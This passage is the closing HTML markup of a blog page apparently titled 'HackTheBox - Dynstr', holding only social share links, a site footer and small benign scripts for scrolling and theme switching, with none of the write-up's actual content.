13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Dynstr on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdynstr%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Dynstr on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Dynstr%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdynstr%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Dynstr on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Dynstr&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fdynstr%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>